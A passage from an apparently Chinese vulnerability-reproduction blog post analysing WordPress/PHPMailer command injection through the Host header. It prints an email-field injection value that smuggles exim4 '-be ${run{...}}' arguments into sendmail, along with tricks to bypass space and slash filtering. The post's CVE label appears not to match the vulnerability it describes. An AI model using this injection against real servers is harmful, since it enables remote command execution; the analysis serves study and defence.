<p>![image-20230829160821813](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829160821813.png)</p>
<p>接着跟进<code>setFrom</code>函数，定位到<code>wp-includes/class-phpmailer.php</code>，发现其用到了PHPMailer组件</p>
<p><code>setFrom</code>函数如下，这个函数对数据进行校验，没问题的话设置Sender变量为address变量的值</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setFrom</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$auto</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\r\n]+/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Strip breaks and trim</span>
        <span class="token comment">// Don't validate now addresses with IDN. Will be done in send().</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token keyword">or</span>
            <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">has8bitChars</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">,</span> <span class="token operator">++</span><span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">idnSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span>
            <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">validateAddress</span><span class="token punctuation">(</span><span class="token variable">$address</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">lang</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid_address'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token variable">$error_message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">edebug</span><span class="token punctuation">(</span><span class="token variable">$error_message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">exceptions</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">phpmailerException</span><span class="token punctuation">(</span><span class="token variable">$error_message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">From</span> <span class="token operator">=</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">FromName</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auto</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Sender</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Sender</span> <span class="token operator">=</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中<code>validateAddress()</code>函数在同文件下，函数前半部分如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$patternselect</span> <span class="token keyword">or</span> <span class="token variable">$patternselect</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'auto'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span>
            <span class="token comment">//Constant was added in PHP 5.2.4</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PCRE_VERSION'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PCRE_VERSION</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'8.0.3'</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$patternselect</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'pcre8'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token variable">$patternselect</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'pcre'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'extension_loaded'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcre'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">//Fall back to older PCRE</span>
                <span class="token variable">$patternselect</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'pcre'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'5.2.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$patternselect</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token variable">$patternselect</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'noregex'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>经过测试发现<code>$patternselect</code>变量被设置为pcre8，因此在函数后面执行如下代码中的pcre8的case</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$patternselect</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">case</span> <span class="token string single-quoted-string">'pcre8'</span><span class="token punctuation">:</span>
              <span class="token operator">...</span>
          <span class="token keyword">case</span> <span class="token string single-quoted-string">'pcre'</span><span class="token punctuation">:</span>
              <span class="token operator">...</span>
          <span class="token keyword">case</span> <span class="token string single-quoted-string">'html5'</span><span class="token punctuation">:</span>
              <span class="token operator">...</span>
          <span class="token keyword">case</span> <span class="token string single-quoted-string">'noregex'</span><span class="token punctuation">:</span>
		<span class="token operator">...</span>
          <span class="token keyword">case</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">:</span>
          <span class="token keyword">default</span><span class="token punctuation">:</span>
              <span class="token operator">...</span>
      <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>pcre8的代码注释</p>
<blockquote>
<p>Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.</p>
</blockquote>
<p>基于php内置的邮箱验证的基础上做的修改</p>
<blockquote>
<p><code>php</code> Use PHP built-in FILTER_VALIDATE_EMAIL;</p>
</blockquote>
<p>查阅php官网</p>
<p>![image-20221115091819538.png](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/1668523449643126528.png)</p>
<p>这个验证方式允许使用括号或双引号使邮箱地址包含空格，因此在Hosts字段构造的发件人的邮箱可以是</p>
<pre class="line-numbers language-none"><code class="language-none">target(any -froot@localhost -be ${run{$payload}} null)@qq.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>经过验证和过滤之后的函数调用</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$phpmailer</span>
<span class="token operator">=&gt;</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		wp<span class="token operator">-</span>includes<span class="token operator">/</span>pluggable<span class="token operator">.</span>php<span class="token comment">#471</span>
<span class="token operator">=&gt;</span><span class="token function">postSend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 	wp<span class="token operator">-</span>includes<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>phpmailer<span class="token operator">.</span>php<span class="token comment">#1125</span>
<span class="token operator">=&gt;</span><span class="token function">mailSend</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	wp<span class="token operator">-</span>includes<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>phpmailer<span class="token operator">.</span>php<span class="token comment">#1247</span>
<span class="token operator">=&gt;</span><span class="token function">mailPassthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	wp<span class="token operator">-</span>includes<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>phpmailer<span class="token operator">.</span>php<span class="token comment">#1368</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将payload传入到<code>mailPassthru()</code>函数中，函数代码如下</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">mailPassthru</span><span class="token punctuation">(</span><span class="token parameter">$to<span class="token punctuation">,</span> $subject<span class="token punctuation">,</span> $body<span class="token punctuation">,</span> $header<span class="token punctuation">,</span> $params</span><span class="token punctuation">)</span>
   <span class="token punctuation">{</span>
       <span class="token comment">//Check overloading of mail function to avoid double-encoding</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'mbstring.func_overload'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           $subject <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">secureHeader</span><span class="token punctuation">(</span>$subject<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
           $subject <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">encodeHeader</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">secureHeader</span><span class="token punctuation">(</span>$subject<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'safe_mode'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>UseSendmailOptions<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           $result <span class="token operator">=</span> @<span class="token function">mail</span><span class="token punctuation">(</span>$to<span class="token punctuation">,</span> $subject<span class="token punctuation">,</span> $body<span class="token punctuation">,</span> $header<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
           $result <span class="token operator">=</span> @<span class="token function">mail</span><span class="token punctuation">(</span>$to<span class="token punctuation">,</span> $subject<span class="token punctuation">,</span> $body<span class="token punctuation">,</span> $header<span class="token punctuation">,</span> $params<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       <span class="token keyword">return</span> $result<span class="token punctuation">;</span>
   <span class="token punctuation">}</span>	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于没有开启安全模式，因此调用的是<code>$result = @mail($to, $subject, $body, $header, $params);</code></p>
<p><code>@mail</code>是调用原生的<code>mail()</code>，在<code>/wp-includes/class-phpmailer.php</code>中定义</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/**
    * Which method to use to send mail.
    * Options: "mail", "sendmail", or "smtp".
    * @var string
    */</span>
   <span class="token keyword">public</span> $Mailer <span class="token operator">=</span> <span class="token string">'mail'</span><span class="token punctuation">;</span>	
<span class="token comment">/**
    * The path to the sendmail program.
    * @var string
    */</span>
   <span class="token keyword">public</span> $Sendmail <span class="token operator">=</span> <span class="token string">'/usr/sbin/sendmail'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查阅php手册</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mail</span><span class="token punctuation">(</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$to</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$subject</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$message</span><span class="token punctuation">,</span>
    <span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">string</span> <span class="token variable">$additional_headers</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$additional_params</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对第五个参数有如下描述</p>
<blockquote>
<p>The <code>additional_params</code> parameter can be used to pass  additional flags as command line options to the program configured to be used when sending mail, as defined by the <code>sendmail_path</code> configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the <code>-f</code> sendmail option.</p>
<p>This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters.  For security reasons, it is recommended for the user to sanitize this  parameter to avoid adding unwanted parameters to the shell command.</p>
<p>‘additional_params’参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序，如’  sendmail_path ‘配置设置所定义的那样。例如，当使用带有’-f’  sendmail选项的sendmail时，可以使用它来设置信封发送者地址。</p>
<p>该参数通过escapeshellcmd()在内部转义，以防止命令执行。escapeshellcmd()阻止命令的执行，但是允许添加额外的参数。出于安全考虑，建议用户对该参数进行消毒，以避免向shell命令添加不必要的参数。</p>
</blockquote>
<p>实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code></p>
<p>mail() 执行后，会执行这样的指令 <code>sendmail -t -i -fwordpress@过滤后的数据包头中的Host字段值</code></p>
<p>另外<code>sendmail</code>符号链接到<code>exim4</code>，<code>exim4</code>的<code>-be</code>参数能开启字符串扩展测试模式，允许提取一些变量数据</p>
<p><code>$tod_log</code>返回系统时间，<code>$spool_directory</code>返回路径值<code>/var/spool/exim4</code>，因此可以用<code>${substr{10}{1}{$tod_log}}</code>代替空格、<code>${substr{0}{1}{$spool_directory}}</code>代替斜杠来绕过<code>-be</code>后面参数中空格和斜杠，以及<code>run</code>可以运行程序</p>
<p>因此上面提到的payload</p>
<p>因此上面提到的payload</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">target</span><span class="token punctuation">(</span>any <span class="token operator">-</span>froot@localhost <span class="token operator">-</span>be $<span class="token punctuation">{</span>run<span class="token punctuation">{</span>$payload<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最后变成</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">sendmail <span class="token operator">-</span>t <span class="token operator">-</span>i <span class="token operator">-</span>fwordpress@<span class="token function">target</span><span class="token punctuation">(</span>any <span class="token operator">-</span>froot@localhost <span class="token operator">-</span>be $<span class="token punctuation">{</span>run<span class="token punctuation">{</span>$payload<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样就可以执行run中的命令</p>
<p>如果直接在命令行里使用，需要给run加引号</p>
<p>![image-20230829161640747](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829161640747.png)</p>
<h2 id="0x07-参考文章">0x07 参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40228200/article/details/128461257">wordpress 4.6任意命令执行漏洞（PwnScriptum）复现</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2301">WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)复现分析</a></p>
<p>[<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">WordPress 4.6 任意命令执行漏洞 (PwnScriptum)</a>](<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">https://wuxiuo.com/archives/83</a>)</p>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/383372">深入分析WordPress4.6(PHPMailer)命令执行漏洞(CVE-2016-10033)</a></p>
<p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/wordpress/pwnscriptum/">Wordpress 4.6 远程代码执行漏洞（PwnScriptum）</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/">http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CVE/">
                                    <span class="chip bg-color">CVE</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">随缘，看各位佬的心情</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/08/30/moectf-2023-wp/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="MoeCTF 2023 - 持续更新">
                        
                        <span class="card-title">MoeCTF 2023 - 持续更新</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/08/24/easy-web/">
